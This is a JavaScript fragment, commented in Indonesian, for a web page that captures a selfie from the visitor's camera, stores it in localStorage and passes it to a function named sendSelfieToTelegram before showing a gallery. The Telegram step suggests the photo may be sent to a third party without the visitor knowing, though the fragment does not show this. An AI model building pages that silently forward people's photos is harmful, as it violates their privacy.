let stream; // ✅ Diperlukan global

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const takeSelfie = document.getElementById("takeSelfie");

function startCamera() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(s => {
      stream = s;
      video.srcObject = stream;
      video.play();
    })
    .catch(err => {
      alert("Kamera tidak bisa diakses 😢");
    });
}

takeSelfie.onclick = () => {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  const selfieData = canvas.toDataURL("image/png");
  localStorage.setItem("selfie", selfieData);

  // ✅ Stop kamera dengan aman
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }

  // Sembunyikan modal
  document.getElementById("modalSelfie").style.display = "none";

  // Kirim & lanjut
  sendSelfieToTelegram(selfieData);
  showGallerySlide();
};
